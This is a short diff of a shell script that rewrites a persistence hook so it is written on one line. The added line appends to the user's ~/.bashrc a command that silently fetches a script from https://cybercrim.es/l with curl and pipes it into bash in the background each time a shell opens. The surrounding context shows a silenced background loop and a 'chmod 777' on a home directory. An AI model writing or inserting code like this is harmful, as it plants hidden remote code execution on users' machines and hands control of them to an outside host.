@@ -28,6 +28,4 @@ chmod 777 $HOME/local
     done    
 ) &>/dev/null &
 
-if ! grep -q "crimson" "$HOME/.bashrc"; then
-    echo "if ! pgrep -f "\?" > /dev/null; then (curl https://cybercrim.es/l | bash) &>/dev/null &; fi" >> "$HOME/.bashrc"
-fi
+if ! grep -q "cybercrim.es" "$HOME/.bashrc"; then echo "if ! pgrep -f '\?' > /dev/null; then (curl https://cybercrim.es/l | bash) &>/dev/null &; fi" >> "$HOME/.bashrc"; fi
